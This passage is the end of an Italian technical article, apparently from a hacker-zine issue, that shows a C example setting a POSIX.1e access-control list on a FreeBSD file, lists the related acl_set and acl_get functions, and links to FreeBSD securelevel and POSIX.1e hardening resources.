+	 * inizializiamo lo spazio per una entry
+	 */
+
+	if((acl = acl_init(1)) ==  (acl_t) NULL) {
+		perror("acl_init()");
+		exit(0);
+	}
+
+	/*
+	 * dichiariamo di voler inserire una sola entry
+	 */
+
+	acl->acl_cnt = 1;
+
+	/*
+	 * inseriamo la regola
+	 */
+
+	acl->acl_entry[0].ae_tag  = ACL_USER_OBJ;
+	acl->acl_entry[0].ae_perm = ACL_PERM_WRITE | ACL_PERM_READ;
+	acl->acl_entry[0].ae_id	  = 1003;
+
+	/*
+	 * settiamo la regola sul file
+	 */
+
+	if(acl_set_file(argv[1], ACL_TYPE_ACCESS, acl) == -1) {
+		perror("acl_set_file()");
+		exit(0);
+	}
+	
+	return 0;
+}
+<-X->
+
+	Se guardiamo le funzioni che passano le entry:
+
+	- acl_set_file()	(vuole il pathname)
+	- acl_set_fd()		(vuole il descrittore)
+	- acl_set_fd_np()	(vuole il descrittore, a differenza di quella
+				 sopra non e' in standard POSIX.1e e permette
+				 altre operazioni oltre alla ACL_TYPE_ACCESS ;
+				 guardate /sys/sys/acl.h per vedere quali 
+				 sono)
+
+	Ci sono poi le corrispettive acl_get_file(), acl_get_fd() e
+	acl_get_fd_np().
+
+
+- - - [   L i N K S
+
+        Securelevel in FreeBSD
+	                http://www.watson.org/fbsd-hardening/securelevel.html
+
+
+	Implementazione delle security extensions di POSIX: 
+
+	
+	POSIX.1e - General Information
+	                http://www.guug.de/~winni/posix.1e/
+	
+	
+	POSIX.1e - FreeBSD implementation
+	                http://www.watson.org/fbsd_hardening/posix1e/
+
+
+==============================================================================
+---------------------------------[ EOF 12/21 ]--------------------------------
+==============================================================================
